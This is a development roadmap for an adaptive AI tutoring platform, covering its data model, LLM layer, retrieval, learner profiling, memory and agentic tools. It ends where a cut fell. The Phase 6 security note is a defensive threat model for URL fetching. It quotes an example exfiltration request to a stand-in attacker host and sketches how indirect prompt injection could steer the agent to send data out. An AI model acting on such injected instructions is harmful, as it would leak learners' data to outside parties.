# Guru — Phased Roadmap

> **Status:** Living execution plan. The *what & why* lives in [MASTERPLAN.md](./MASTERPLAN.md),
> deeper engineering detail in [TECHNICAL_DESIGN.md](./TECHNICAL_DESIGN.md); this file is *how & in
> what order*. Built for the working rhythm: **plan → small change → check in → repeat.** Each phase
> is independently shippable and verifiable. Check off items as they land.

**Working agreement**

- Keep changes small and reviewable; check in with the maintainer between slices.
- Every phase ends green: `uv run poe check` (lint + type + test) passes.
- Prefer reusing existing utilities/patterns over new code.
- Don't build deferred items (see Masterplan §9) before their phase.

**Legend:** ☐ todo ☑ done · **DoD** = Definition of Done.

---

## Phase 0 — Foundations

**Goal:** a clean, runnable skeleton with the full quality gate wired up.

**Scope**
- ☑ `app/core/config.py` — typed settings via `pydantic-settings`; `.env` + committed `.env.example`.
- ☑ `app/core/db.py` — async SQLAlchemy 2.0 engine + session (asyncpg); FastAPI dependency + `Base`.
- ☑ `app/core/logging.py` — structured logging (structlog) with request IDs (`app/core/middleware.py`).
- ☑ beartype claw enabled for runtime type checking in dev/test (`app/__init__.py`, prod-guarded).
- ☑ Alembic initialized under `db/migrations/`; first migration enables `vector` + `pg_trgm`.
- ☑ `docker-compose.yml` — Postgres (pgvector, host **5433**) + Redis for local dev.
- ☑ `poe check` aggregate task = `lint` + `type-check` + `test`.
- ☑ **GitHub Actions CI** (`.github/workflows/ci.yml`) — format-check, lint, type-check, test, and a
  migration-apply check against a pgvector service. *CD deferred to Phase 8 (no deploy target yet).*
- ☐ Pre-commit hooks (ruff format/lint, etc.) — follow-up.

**DoD:** ✅ `uv run poe check` passes · ✅ `uv run poe dev` boots, `GET /health` returns ok ·
✅ `docker compose up` brings up Postgres+pgvector · ✅ first migration applies extensions cleanly ·
✅ CI workflow valid (lockfile frozen-ready).

> Done. Note: host Postgres port is **5433** (5432 was occupied); `greenlet` added for SQLAlchemy async.
> CI runs once the repo is pushed to GitHub (not yet a git repo).

---

## Phase 1 — Domain core & knowledge graph

**Goal:** the backbone data model exists and is queryable.

**Scope**
- ☑ ORM models: `Learner` (stub identity), `Subject`, `Topic`, `KC`, prerequisite edges (`KCEdge`),
  `LearnerKCState`, `LearningEvent` (`app/models/`, UUID PKs + timestamp mixins).
- ☑ Pydantic schemas + CRUD for the knowledge graph (`app/schemas/`, `app/services/`, `app/api/v1/`).
- ☑ Stub auth dependency (`get_current_learner`) creating a dev learner on first use; `learner_id`
  threaded through every endpoint from the start (`app/api/deps.py`).
- ☑ Alembic migration `0002_knowledge_core`. Service + API integration tests with transactional
  rollback isolation (`tests/conftest.py`).

**DoD:** ✅ build a Subject→Topic→KC graph with prerequisites via the API and read it back (covered by
`tests/test_knowledge.py`) · ✅ tests cover model + CRUD (13 tests) · ✅ migration applies (and
round-trips down/up).

> Done. Endpoints under `/api/v1` (subjects/topics/kcs/prerequisites); 404/409/400/422 handled.

---

## Phase 2 — LLM abstraction + model-role registry + tutor chat

**Goal:** talk to a guru through a provider-agnostic, role-based, testable LLM layer.

**Scope**
- ☑ `app/llm/` provider-agnostic interface; unified message + tool schema; embeddings method.
- ☑ **Model-role registry**: `FAST` / `SMART` / `GENIUS` / `EMBED` → `(provider, model)` resolved
  from config **per environment**. Code references roles only.
- ☑ Providers: **Ollama** (local dev), **OpenRouter** (cloud/prod), `AnthropicProvider`, and
  `FakeProvider` (deterministic tests). Dev maps `FAST`→Ollama, `SMART`/`GENIUS`→cheap OpenRouter.
- ☑ SSE streaming chat endpoint with a tutor persona; persisted `Conversation` / `Message`.
- ☑ Per-call **token & cost logging** (tagged by role + model).

**DoD:** streaming chat works end-to-end via the registry against a real model; switching a role's
model is a config change with no code edits; unit tests run offline on `FakeProvider`; an Ollama
integration test exercises real local generation; token/cost recorded per call.

> Use the `claude-api` skill when implementing the Anthropic provider. Prod role map (example):
> `SMART`=`claude-sonnet-4-6`, `GENIUS`=`claude-opus-4-8`, `FAST`=cheap OSS/Haiku. Concrete model
> names are config values (see TECHNICAL_DESIGN).

> Done. `OpenAICompatProvider` serves Ollama + OpenRouter; `AnthropicProvider` uses the native SDK
> (model-agnostic, no sampling params). SSE tutor chat at `POST /api/v1/conversations/{id}/messages`
> streams tokens and persists `Conversation`/`Message`/`LLMCall` (token+cost per call). Offline tests
> on `FakeProvider`; a skippable Ollama integration test exercises real local generation.

---

## Phase 3 — Knowledge tracer + assessment loop

**Goal:** the engine that makes Guru adaptive — minimal but end-to-end.

**Scope**
- ☑ `KnowledgeTracer` interface: `estimate / update / due_reviews`.
- ☑ Continuous **Elo/Glicko** estimator per KC with **uncertainty**; online updates.
- ☑ **Hierarchical roll-up** KC → Topic → Subject (weighted, uncertainty propagated); multi-KC
  credit apportioning.
- ☑ Assessment item models (MCQ, cloze, short, long) + per-KC rubrics.
- ☑ Auto-grading + **LLM rubric grading → graded/partial-credit** observations.
- ☑ **FSRS** scheduler for reviews.
- ☑ KC-tagged `LearningEvent` logging on every interaction (also the substrate the **learner
  profile** estimators consume in Phase 5 — capture latency, hints, correctness richly now).
- ☑ Seed of the **eval harness** (grading reliability + tracer sanity).

**DoD:** answering items updates per-KC ability + uncertainty, rolls up to subject, schedules
reviews via FSRS, and writes a replayable event; rubric grading yields partial credit; tests +
first eval cases pass.

**Done.** Tracer is a Glicko-style estimator on the logit scale (`E = sigmoid(θ − d)`, precision-
weighted Bayesian update, `√(RD² + c²·t)` decay) behind a swappable `MasteryEstimator`; the DB-backed
`KnowledgeTracer` (`GlickoTracer` + `DEFAULT_TRACER`) wraps it with persistence, multi-KC apportioning,
roll-up, and FSRS. Grading dispatches auto (MCQ/cloze/fill-blank) · LLM rubric (short/long, SMART
role) · self (flashcard → FSRS rating); the answer endpoint commits grade + per-KC state + events
atomically. FSRS state is stored opaquely as a serialized card; `GET /reviews/due` lists due KCs.
Eval harness seeds `tests/eval/` (golden grading + tracer suites gate CI; live rubric suite runs on
Ollama) with a `poe eval` runner.

---

## Phase 4 — Multimodal ingestion + content engine + RAG

**Goal:** real teaching material — ingested from any source, reusable, grounded, cost-controlled.

**Scope**
- ☑ **Ingestion source adapters** normalize into one `document → chunks → embeddings + provenance`
  pipeline, run as Redis-backed background jobs (**taskiq**) — shipped in two waves (4a then 4b).
- ☑ **4a (text-first):** office docs — PDF, PPTX, DOCX, XLSX, TXT — + **public weblinks**
  (fetch + readability extraction, robots-aware).
- ☑ **4b (heavier modalities):** **handwritten notes via vision-LLM OCR**; **audio/video via ASR**
  (Whisper; video → demux audio + keyframe OCR); **per-chunk KC auto-tagging**.
- ☑ Content building blocks (lessons, brief + comprehensive wikis, question banks): AI-generated,
  **KC-tagged**, cached/reusable, **assembled** per learner. *(Profile-driven personalization → Phase 5.)*
- ☑ **Hybrid retrieval** (pgvector HNSW + tsvector/GIN + metadata filter); grounded generation with
  provenance/citations.
- ☑ Embeddings via the `EMBED` role; ingestion + content pre-generation on the queue.

**DoD:** a learner can upload a PDF, a handwritten photo, an audio file, and paste a URL — all become
retrievable, provenance-tagged chunks; a learner goal yields assembled, KC-tagged lessons/wikis
grounded in retrieved knowledge with citations; generation reuses cached blocks where possible.

> Sequence 4a before 4b: ship text/doc/web ingestion first (covers most value), then add OCR/ASR.
>
> **4a done.** Object storage behind a `BlobStore` seam (S3/MinIO + in-memory); taskiq broker seam
> (Redis prod, in-memory tests); per-format adapters (PyMuPDF/python-docx/python-pptx/openpyxl/
> trafilatura) with page/slide/paragraph/sheet locators; idempotent extract→normalize→chunk→embed→store
> pipeline; `Source`/`Chunk` (`Vector(768)` HNSW + generated `tsvector` GIN) and `ContentBlock`
> (migrations 0007–0008); RRF hybrid retrieval with learner/subject/topic/source scope; cached,
> cited content engine. Eval harness extended with retrieval-recall + grounding-citation suites.
>
> **4b done.** Vision-capable LLM layer (`VISION` role) + image/scanned-PDF vision-OCR; large-document
> ingestion (streaming blob I/O at constant memory, bounded-concurrency OCR + batched embeds, EPUB);
> audio ASR behind a `Transcriber` seam (faster-whisper, optional `asr` extra); video behind a
> `MediaDemuxer` seam (ffmpeg demux → audio-track ASR + evenly-sampled keyframe OCR); per-chunk KC
> auto-tagging (`ChunkKC` + migration 0009 — FAST model tags each chunk against subject/topic-scoped
> candidate KCs). Eval harness extended with a live-model KC-tagging suite. **Phase 4 complete.**

---

## Phase 5 — Orchestration + lesson-plan policy + placement + profile + study aids + memory

**Goal:** the guided, personalized journey comes together on a real orchestration substrate.

**Scope**
- ☑ Introduce **LangGraph** as the orchestration substrate; migrate the tutoring turn + lesson
  generation into stateful graphs (nodes pull models by role from the registry).
- ☑ **Interactive prompt-refinement gate** (HITL subgraph): co-constructs the learner's goal/prompt
  in a loop — propose → learner feedback → refine — **until the learner is satisfied**, then commits
  to generation. Doubles as a placement/metacognition moment + profile cold-start signal.
- ☑ Placement diagnostic (light test + inference + asking) → seed KC priors.
- ☑ **Learner profile**: `LearnerProfile` interface + behavior-first estimators reading the event
  log; trait/state + uncertainty; cold-start from intake + refinement gate + placement; learner
  view/reset.
- ☑ Adaptive **lesson-plan generator/policy** reading mastery **and** profile: objectives →
  prerequisite-ordered KCs, scaffolding by tier, **profile-driven** step size / challenge / hint
  policy / example selection; revised on evidence.
- ☑ Session runner that follows/updates the plan.
- ☑ Study aids: flashcards, spaced-repetition surfacing (FSRS due reviews), fill-in-the-blank.
- ☑ Per-user **memory** subsystem wired into sessions (facts, preferences, summarization, write-back).

> **Substrate landed.** LangGraph introduced behind `app/agent/`; the tutor turn now runs as
> a single-node state graph (`build_tutor_graph`) driven by a `run_tutor_turn` service that
> owns persistence, with byte-identical SSE. Nodes call our role-based `LLMClient` (no
> LangChain models); token streaming rides the custom stream writer.
>
> **Refinement gate landed.** A second graph (`build_refinement_graph`, `app/agent/refinement.py`)
> implements `propose → ask_learner (HITL interrupt) → satisfied?/max-rounds → commit`, compiled
> with an `InMemorySaver` checkpointer so the pause/resume survives across HTTP requests within a
> process. No new endpoint: `POST /conversations/{id}/messages` (`app/api/v1/chat.py`) dispatches
> per call — goal-less + no history → start the gate; goal-less + mid-flight (checkpoint paused) →
> resume it; goal committed → plain tutor turn, now grounded by `Conversation.goal` in the system
> prompt. If checkpoint state is lost (process restart) mid-gate on a conversation with history,
> it degrades to plain chat rather than re-prompting for a goal. **Known limitation:** the
> checkpointer is process-local — not durable across restarts, not multi-worker-safe; fine for
> single-process Phase 5, revisit with a Postgres-backed saver before Phase 8 scaling.
>
> **Placement diagnostic landed.** No new graph — a plain two-endpoint flow (`app/api/v1/placement.py`):
> `GET /subjects/{id}/placement/prompt` returns a fixed background question, `POST
> /subjects/{id}/placement` (`app/services/placement.py`) infers rough per-KC starting levels
> from the learner's free-text answer (`app/learning/placement_inference.py`, FAST role,
> KC-tagging-style numbered-candidate JSON prompt), seeds `LearnerKCState` only for KCs with no
> existing state (`mastery.seed_prior` — never overwrites real evidence), and surfaces a light
> test of up to `placement_light_test_size` root KCs (no incoming prerequisite) for the learner
> to answer through the existing, unchanged `/items/{id}/answer` endpoint. Items are generated
> on demand (`app/learning/item_generation.py`, FAST-role MCQ generation — new capability, since
> the Phase 4 "question bank" content has no answer key/`Item` link) and persisted into the
> shared, learner-unscoped item bank, so later placements/lessons for that KC reuse them instead
> of regenerating. **Known limitation:** the `"some"`/`"strong"` → ability/uncertainty mapping is
> a reasonable-but-arbitrary v1 placeholder, not calibrated against real outcome data.
>
> **Learner profile landed.** EAV-shaped `learner_profiles`/`profile_dimensions`
> (`app/models/profile.py`) so the dimension catalog lives entirely in code
> (`DIMENSION_SPECS` in `app/learning/profile_estimators.py`) — adding or dropping a dimension
> is a code change, never a migration, which matters because the catalog is expected to be
> pruned once real usage data shows which dimensions are actually predictive. Twelve dimensions
> shipped across all four MASTERPLAN families, all backed by real estimators over data already
> captured (no new capture surfaces): *cognitive & pace* — `pace` (median latency + speed
> trend), `optimal_challenge` (productive-struggle difficulty band), `error_type` (one batched
> FAST-model call classifying wrong answers conceptual/procedural/careless), `cognitive_load_tolerance`
> (within-session accuracy drop); *metacognition* — `help_seeking` (mean hints/item),
> `persistence` (bounce-back rate after a wrong answer); *motivation & affect* — `engagement`
> (state; error-streak proxy over the most recent session only), `goal_orientation` (one FAST
> call classifying `Conversation.goal` as mastery- vs performance-oriented — the refinement
> gate's cold-start signal flows in with no extra wiring); *context & preferences* — `interests`
> (FAST-extracted topic tags from the learner's own messages), `reading_level` (pure
> Flesch-Kincaid-style grade level, no LLM call), `session_logistics` (typical session length +
> preferred hour from gap-clustered sessions), and `format_effectiveness` (score/difficulty by
> `Item.item_type` — the outcome-linked "which assessment format actually works for this
> learner" signal that future generation/format-selection decisions consume). Deliberately
> **not** shipped: `calibration` and `confidence` (MASTERPLAN-named, but no self-prediction or
> real affect signal exists yet to compute them honestly) and true delivery-modality VARK
> (visual/auditory/kinesthetic — no content-format tracking on interactions exists yet); all
> three are additions the catalog can absorb later with zero schema change. Refresh is
> **on-demand** (`POST /profile/refresh`), not triggered on every graded answer — recomputing a
> dozen dimensions (three of which call an LLM) after every item would be wasteful;
> `assessment.answer_item` stays untouched. Trait dimensions read a learner's full event
> history, state dimensions (`engagement`) read only the most recent session — no incremental
> EWMA blending in v1, since full recompute is cheap at this data scale. Learner view/reset:
> `GET /profile`, `POST /profile/{key}/reset`. Memory is the remaining Phase 5 slice.
>
> **Lesson-plan policy landed** — designed as a genuinely dynamic policy, not a document
> regenerated only on request. `LessonPlan` (`app/models/lesson_plan.py`, one row per
> `(learner_id, subject_id)`) stores `steps` carrying per-step **status**
> (`pending`/`active`/`done`), so the plan itself is a live record of what will be learned and
> what already has been — not just a fixed sequence. Generation is split into two tiers by cost:
> `generate_lesson_plan` (`app/services/lesson_plan.py`) is the expensive, on-demand path — one
> FAST-role objective-selection call over a numbered KC candidate list (same shape as
> placement/KC-tagging; a malformed/no-goal reply falls back to targeting the whole subject),
> prerequisite-closure (BFS) + topo-sort (Kahn's algorithm) over the KC DAG; `revise_plan` is the
> cheap, **auto-triggered** path — no LLM call, no topo-sort recompute, just a pure re-derivation
> (`revise_steps` in `app/learning/lesson_plan.py`) of status/order/hints over the *existing*
> step list. `revise_plan` runs automatically after every graded answer
> (`assessment.answer_item`, scoped to the touched KCs' subject) and after every profile refresh
> (`profile.refresh_profile`, across every plan the learner has) — both no-op if the learner has
> no plan for that subject yet. This is "revised on evidence" (TECHNICAL_DESIGN §7.7) taken
> literally: a mastered KC's step one-way-ratchets to `done`; a KC coming due for FSRS review
> gets inserted as a `review` step ahead of new material (soonest-due first) and flips to `done`
> once no longer due; `optimal_challenge`/`help_seeking`+`persistence`/`format_effectiveness`
> refresh every non-done step's `target_difficulty`/`hint_density`/`preferred_item_type`, while
> `pace`/`interests`/`reading_level` refresh the plan-level `pacing`/`example_tags`/
> `reading_level_hint` — every hint degrading to `None`/a neutral default if its source profile
> dimension hasn't been computed yet. The tutor conversation graph now **reads the plan**:
> `run_tutor_turn` folds the learner's active step (KC, target difficulty, hint density,
> preferred item type) into the system prompt the same way `Conversation.goal` already does — no
> `TutorState` schema change, no new graph node — so the plan actually drives generation instead
> of sitting beside it. Endpoints: `POST`/`GET /subjects/{id}/lesson-plan`. **Known v1
> simplifications:** "well mastered" (`ability >= 1.0, uncertainty <= 0.5`) is an arbitrary
> threshold, same spirit as placement's level→estimate mapping; "scaffolding by tier" collapses
> to one tier (adult-only MVP), so the profile is the whole adaptive lever for now; tutor-turn
> grounding uses the learner's **most-recently-updated plan** across all subjects, since
> conversations aren't subject-scoped yet — revisit when the session runner needs tighter
> per-conversation scoping. Full step-advancement through live conversation (marking a step done
> because a session covered it) is the session runner's job, next. **Correction (Phase 5
> review):** the plan-level `pacing`/`example_tags`/`reading_level_hint` hints are computed and
> stored correctly (and test-asserted to shift with `pace`/`interests`/`reading_level`), but nothing
> downstream — no generation path, no prompt — actually reads them yet; only the per-step
> `target_difficulty`/`hint_density`/`preferred_item_type` hints are consumed (the last
> structurally, via `session_runner`; the first two as advisory tutor-prompt text). There is no
> "step size" concept anywhere in the codebase. A future slice that wants pacing to visibly affect
> the session (e.g. how many new KCs per sitting) has a real, tested signal to build on — it just
> isn't wired to anything yet.
>
> **Session runner landed.** No new `Session` model and no new LangGraph graph/interrupt —
> "session" stays a derived concept (same spirit as the profile's `session_logistics`), and the
> runner is a small addition on top of the substrate that already existed: `Conversation` gains
> an optional `subject_id` (`app/models/chat.py`, set once at creation, never changed), which
> turns the previous slice's "most-recently-updated plan" heuristic in
> `lesson_plan.get_active_step_context` into an exact `(learner, subject)` lookup whenever a
> conversation is scoped to one — the heuristic itself is untouched and still the fallback for
> subject-less conversations. `app/services/session_runner.py::next_item` is the one new piece:
> it resolves the plan's active step and turns it into an actual practice item — reusing a bank
> item for the KC if one exists (`assessment.find_item_for_kc`), generating one (FAST role) only
> if the bank is empty, and working identically for `"new"` and `"review"` steps, so FSRS-due
> reviews surfaced by the plan get served as practice for free. `run_tutor_turn` calls it for
> subject-scoped conversations and attaches the result to the `done` SSE frame as a new optional
> `item` field — resolved fresh every turn, not tracked as "already served," since it's a
> separate structured field rather than something spliced into conversation history. Critically,
> **"updates the plan" adds no new mechanism**: the item is answered through the existing,
> unchanged `POST /items/{id}/answer` endpoint, which already runs the tracer and
> auto-`revise_plan` (previous slice) — the tracer stays the only thing that moves mastery, on
> purpose, rather than a second "the conversation seemed to cover this" signal running in
> parallel. Verified live end-to-end against real Postgres + Ollama: a served item answered
> through the real endpoint flipped its step to `done` and the very next turn's item correctly
> disappeared, all without a single lesson-plan endpoint call. **Known v1 simplifications:** the
> active step's `target_difficulty` hint is not yet applied to item selection (see the study-aids
> note below for `preferred_item_type`, which now is) — the plan drives *which* KC gets
> practiced, not yet *what difficulty* it's practiced at; `subject_id` is set API-first with no
> caller yet (no frontend exists before Phase 7) — a future "continue subject X" entry point is
> expected to populate it, same bootstrapping pattern every other Phase 5 endpoint has shipped
> under.
>
> **Study aids landed.** No new mutation surface here either — this slice only widens *what*
> `session_runner` can serve. `app/learning/item_generation.py` gained
> `generate_fill_blank_item`/`generate_flashcard_item` (same FAST-role JSON-prompt shape as the
> existing MCQ generator) plus a `GENERATORS` dispatch map. `session_runner.item_for_kc` replaces
> the previous slice's untyped reuse-then-generate-MCQ with an order that closes the
> `preferred_item_type` gap flagged above: reuse a bank item of the plan's preferred type (a free
> win even for types with no generator, e.g. `cloze`) → generate that type if a generator exists
> → reuse any type → generate MCQ. Steps with no explicit preference default to `"new"` → no
> preference, `"review"` → flashcard, pairing the roadmap's "flashcards" and "spaced-repetition
> surfacing" into one default. `GET /reviews/due` now resolves an answerable flashcard per due KC
> (`session_runner.due_review_items`) instead of returning KC metadata alone — a
> plan-independent review queue, since clearing a spaced-repetition backlog shouldn't require
> being mid-lesson. Resolution is capped at `reviews_due_item_limit` (soonest-due first); the due
> list itself is bounded separately and much more generously (`due_reviews_limit`, see the Phase
> 5 review note below — this doc originally and inaccurately called it untruncated). This is the
> first GET endpoint in the codebase with a
> generation side effect (every other generation call site sits behind a POST) — accepted on the
> same reuse-then-generate-forever economics as everywhere else, now bounded by that cap. **Known
> v1 gaps:** flashcards store the generated answer (`answer_key={"back": ...}`) but nothing
> reveals it to the learner before self-rating yet — self-graded recall is fully trust-the-learner,
> a pre-existing gap this slice scales into the default review experience rather than
> introduces; cloze has no generator (only fill-in-the-blank does), so a profile preference for
> cloze can only ever be served from the bank, never freshly generated; `target_difficulty`
> remains unapplied.
>
> **Memory landed.** Greenfield — `app/memory/` (extraction + vector-only retrieval) plus
> `app/services/memory.py` (write-back/dedup/view/erase), mirroring the closest existing analogs
> end-to-end rather than inventing new patterns: `Memory(learner_id, conversation_id, kind,
> content, embedding)` mirrors `Chunk`'s `Vector(768)` + HNSW shape (no `tsv` column — the
> TECHNICAL_DESIGN §7.1 schema sketch omits one, so retrieval is vector-only for v1, unlike
> RAG's hybrid RRF); `extract_memories` (FAST role, JSON-only) mirrors `kc_tagging.py`'s
> tolerant-parse-or-empty idiom. **Retrieval is what "wires memory into sessions"**: every tutor
> turn embeds the learner's message and folds the top `memory_retrieval_limit` hits into the
> system prompt as a third context note (after goal and plan-grounding), learner-global rather
> than gated behind `subject_id`. **Write-back is separate and on-demand**
> (`POST /conversations/{id}/memory/write-back`, 202, queued via `memory_write_back_task` —
> mirrors the ingestion enqueuer seam byte-for-byte) rather than firing per-turn, since
> extraction costs a real FAST call for no accumulated benefit if run on every message (same
> reasoning as `POST /profile/refresh` staying on-demand). Candidate memories are deduped before
> persisting via cosine distance to an existing same-`(learner, kind)` memory
> (`memory_dedup_max_distance`), reusing the storage primitive rather than a new subsystem —
> meaningfully better than exact-string dedup, since wording drift across extraction calls would
> make that fire almost never. `GET /memory` (view) and both `DELETE /memory/{id}` and bulk
> `DELETE /memory` (erase) ship now rather than later: the NFR's "learner-controllable
> view/reset" bar, stated about the profile, applies at least as strongly to discrete personal
> facts. Verified live end-to-end against real Postgres + Ollama: a fact revealed in one
> conversation, written back, then surfaced unprompted in a *second*, unrelated conversation's
> system prompt — the literal Phase 5 DoD bar. **Known v1 gaps:** deletion has no tombstone — a
> later write-back over overlapping conversation history can re-extract a fact the learner just
> deleted (the capped extraction window ages the overlap out over time, but doesn't prevent it);
> no `source` column distinguishing extraction origin (YAGNI — every row comes from conversation
> extraction today; `conversation_id`'s nullability is the future signal if a second source
> shows up). This closes out Phase 5 — every scope item above is now landed.
>
> **Phase 5 review.** Before closing the phase, every slice above was independently re-checked
> against its own landed-note claims (two parallel reviews covering placement+profile and
> lesson-plan+session-runner+study-aids, plus a direct pass over the substrate/refinement-gate/
> memory code) — not a re-read of this document, a re-check of the actual code and tests. Two real
> bugs turned up and were fixed, both with new regression tests (`uv run poe check`: 382 passed,
> 1 skipped):
>
> - **A live-breaking taskiq bug, root-caused.** `POST /sources/upload|link` and
>   `POST /conversations/{id}/memory/write-back` 500'd on any real `uv run poe dev`/`uvicorn`
>   process — `AttributeError: 'function' object has no attribute 'kiq'` — because beartype's
>   package-wide import hook (`beartype_this_package`, `app/__init__.py`) rewrites every function
>   *definition* it sees, and `@broker.task` sitting directly in that same decorator stack made
>   beartype decorate the resulting `AsyncTaskiqDecoratedTask` *instance* rather than the function
>   — since it can only meaningfully wrap `.__call__`, the module-level task name got rebound to a
>   plain proxy function, silently losing `.kiq()` and every other task method. No test ever caught
>   it because every enqueuer-dependent test overrides the enqueuer to bypass the broker (by
>   design). Fixed in `app/workers/tasks.py` by applying `broker.task(...)` as a plain call after
>   the `async def`, not as decorator syntax — beartype's claw hook only rewrites `def`/`async def`
>   nodes, never plain assignments, so this sidesteps the interaction entirely. `tests/test_workers.py`
>   now asserts both tasks are real dispatchable task objects.
> - **A profile-corrupting multi-KC bug in `persistence`.** A single graded answer to a
>   multi-KC item (`POST /items` accepts `kcs` with no max) fans out into one `LearningEvent` row
>   per tagged KC, all sharing the same `created_at` (`mastery.record_observation`). The
>   `_estimate_persistence` estimator (`app/learning/profile_estimators.py`) grouped events by
>   `item_id` and treated list length as attempt count, so a *single* wrong multi-KC answer alone
>   satisfied its "≥2 attempts" retry check and, since the duplicate rows share one score, always
>   counted as "gave up" — corrupting the persistence rate with zero real retry evidence. Fixed by
>   collapsing same-`(item_id, created_at)` rows into one attempt before counting; regression test
>   added. (The same fan-out mildly inflates the *evidence count* — not the value — of `pace`,
>   `help_seeking`, and `format_effectiveness`, and duplicates a question in `error_type`'s LLM
>   prompt; lower severity, left as a known v1 characteristic rather than fixed everywhere, since
>   generated content is always single-KC and only manually-tagged multi-KC items exercise it.)
>
> One doc/code mismatch was also fixed rather than just noted: `mastery.due_reviews` had a
> hardcoded `limit=50` with no way to override it, contradicting this document's and
> `ReviewItemRead`'s claim that "the due list itself is never truncated." Promoted to a real,
> documented, configurable cap (`due_reviews_limit`, default 200) — distinct from and much larger
> than `reviews_due_item_limit`, which separately bounds item *resolution*. A test gap was also
> closed: `tests/test_chat.py` gained an end-to-end test that answers a served item through the
> real `POST /items/{id}/answer` endpoint (not a direct service call) and confirms the *next* chat
> turn's plan has genuinely advanced — the two halves of "session runner follows/updates the plan"
> were previously only proven separately (unit tests) or manually (live smoke test), never joined
> through the real HTTP endpoints in one automated test.
>
> Everything else held up: per-dimension profile claims spot-checked against code (8 of 12
> estimators verified line-by-line), placement's `seed_prior` scoping, the prerequisite BFS +
> topo-sort, `revise_steps`'s one-way `done` ratchet, `item_for_kc`'s fallback-tier order, the
> refinement gate's resume/degrade-gracefully paths, and the memory subsystem's dedup/retrieval —
> all matched their documented behavior with no further bugs found. The one substantive gap left
> undone by choice (not oversight) is the DoD wording fix above: `pacing` is real and tested but
> unconsumed — flagged rather than papered over with a new "step size" mechanic that wasn't part of
> this review's scope.

**DoD:** a new learner co-constructs a goal through the interactive gate, is placed, gets an adaptive
plan whose pacing/challenge demonstrably shift with profile values (e.g. `optimal_challenge` raises
or lowers a step's `target_difficulty`; `format_effectiveness` picks the item type that scores best
for this learner — both concretely tested off real profile rows, see the Phase 5 review note below),
runs LangGraph-orchestrated sessions with study aids and surfaced reviews, and the experience reflects
persistent memory across sessions.

---

## Phase 6 — Agentic tools & workflows

**Goal:** the unified engine's agentic and workflow modes.

**Scope**
- ☑ Tool registry; live/external-data tool; retrieval-as-tool — exposed as LangGraph tool nodes.
- ☑ Unified engine exposing chat / agentic / workflow modes as composable LangGraph graphs.
- ☑ First structured workflow graph (e.g., guided practice / worked-example walkthrough).

**DoD:** a guru can take a tool-using action and run at least one structured workflow end-to-end,
selected by need/tier.

> **Tool-calling foundation + agentic mode landed (slice 1).** Greenfield — `app/llm/` had zero
> tool-call vocabulary before this slice, despite an old Phase 2 checkbox loosely implying a "tool
> schema" existed. Added provider-agnostic tool types (`ToolDef`/`ToolCall`, `ToolUsePart`/
> `ToolResultPart`, `ChatRole.TOOL`) to `app/llm/types.py`, with each provider translating to its
> own wire shape — Anthropic's `tool_use`/`tool_result` blocks (coalescing consecutive
> `ChatRole.TOOL` messages into one `user` message, since Anthropic requires every pending result
> batched together) and OpenAI's `tool_calls` field / `role: "tool"` messages (one message per
> result, no coalescing — the opposite requirement). Deliberately **hand-rolled**, not LangGraph's
> prebuilt `create_react_agent`/`ToolNode` or Anthropic's Tool Runner — both require a LangChain
> `BaseChatModel`-shaped object or direct SDK usage, which would reintroduce the exact coupling the
> Phase 5 substrate note rejected ("nodes call our role-based `LLMClient`, no LangChain models").
>
> `app/agent/tools.py::build_tools` returns a fresh per-turn `list[Tool]` (mirrors
> `build_tutor_graph(llm)` closing over the request's client) with one real tool this slice,
> `search_materials`, wrapping `app/rag/retrieval.py::retrieve` — only `query` is model-controlled,
> `session`/`llm`/`learner_id`/`subject_id` bind server-side so the model can never spoof a learner
> or supply a subject it has no legitimate way to know. `app/agent/agentic.py::build_agentic_graph`
> compiles a bounded `call_model ⇄ execute_tools` loop (no checkpointer, same no-HITL shape as
> `tutor.py`), capped by `settings.agentic_max_iterations` (default 4) — verified directly by a test
> that scripts a provider which always requests a tool call and asserts the graph still terminates.
> A tool's own failure (unknown name or a raised exception) becomes an error `ToolResult` rather
> than crashing the turn. Reachable via `ChatTurnRequest.mode: "chat" | "agentic"` (per-turn, not
> persisted on `Conversation` — a learner can mix one tool-using turn into an otherwise plain
> conversation); `send_message` checks `mode == "agentic"` first, ahead of the goal/refinement-gate
> branching, so an agentic turn always bypasses goal negotiation. New `"tool_call"` SSE frame.
>
> **Accepted v1 gaps, documented not fixed:** intra-loop tool-call/tool-result exchanges aren't
> persisted as `Message` rows (only the user message and final reply are) — a reloaded conversation
> won't show what was searched; a `ToolCall` audit table mirroring `LLMCall` is the natural
> follow-up. Hitting `agentic_max_iterations` mid-tool-call degrades gracefully (`done` event's
> `detail="capped"`, whatever partial reply exists persists) rather than erroring, mirroring the
> refinement gate's auto-commit-at-`max_rounds` precedent. The `astream`-mode-dispatch boilerplate
> is now duplicated a third time across `run_tutor_turn`/`run_refinement_turn`/`run_agentic_turn`;
> not extracted this slice since the agentic service also needs to branch on `"token"` vs.
> `"tool_call"` custom payloads, so a shared helper would need reshaping — deferred to the workflow
> graph slice, where a third matching-shape call site would make the extraction concrete rather
> than speculative.
>
> **Still open after slice 1:** the live/external-data tool, and the workflow mode + first
> structured workflow graph. Landed in slice 2 below.
>
> **Live/external-data tool landed (slice 2).** `app/rag/fetch.py::default_fetch` — the existing
> primitive, used only by the learner-initiated URL-ingestion path — was left untouched; a new
> `safe_fetch` was added alongside it specifically for **model-controlled** URLs, a categorically
> higher-risk trust boundary (the model decides which URL to fetch based on conversation content
> that can include text from untrusted sources — an ingested page, a `search_materials` hit).
> `safe_fetch` requires every DNS-resolved address for the host to be public — via `ipaddress`'s
> `.is_global` (paired with an explicit multicast exclusion), not a naive enumeration of
> `.is_private`/`.is_loopback`/etc., which misses RFC 6598 CGNAT space (`100.64.0.0/10`) — and does
> not follow redirects (a redirect to an internal address would bypass the pre-connect check; a
> real content-type check, since `raise_for_status()` doesn't raise on 3xx). It checks the
> DNS-resolved address, never the URL string, so decimal/octal IP-literal obfuscation
> (`http://2130706433/`) is a non-issue regardless of encoding. **Accepted, documented gaps, not
> fixed:** a DNS-rebinding TOCTOU window between the resolve-and-check and the actual httpx
> connection (both the robots.txt request and the main request re-resolve independently); and —
> important not to overclaim — this only blocks *internal* targets. It does **not** address
> indirect-prompt-injection-driven exfiltration to a *public* attacker-controlled URL (a
> compromised page's content could still direct the model to `GET http://attacker.example/log?…` —
> a different, unmitigated risk category from SSRF).
>
> `app/agent/tools.py::fetch_webpage` wraps `safe_fetch`, extracting readable text via
> `trafilatura` for HTML (reusing the same extractor `app/rag/adapters/html.py` uses, called
> directly rather than through the full ingestion-adapter machinery — no chunking/storage needed
> for a stateless one-shot tool call) and falling back to plain UTF-8 decode otherwise; binary
